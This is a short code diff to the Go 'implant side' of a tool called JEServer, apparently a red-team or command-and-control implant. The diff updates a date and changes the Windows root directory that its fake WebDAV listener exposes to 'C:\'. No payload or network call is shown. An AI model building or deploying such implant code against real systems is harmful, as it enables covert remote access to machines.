@@ -6,7 +6,7 @@ package main
  * Implant side of JEServer
  * By J. Stuart McMurray
  * Created 20220326
- * Last Modified 20220331
+ * Last Modified 20220402
  */
 
 import (
@@ -92,7 +92,7 @@ func main() {
 	var wdDir = "/"
 	WDListener = NewFakeListener("webdav", "internal")
 	if "windows" == runtime.GOOS {
-		wdDir = `\\?\`
+		wdDir = `C:\` /* Just enough, I guess? */
 	}
 	go func() {
 		Logf(
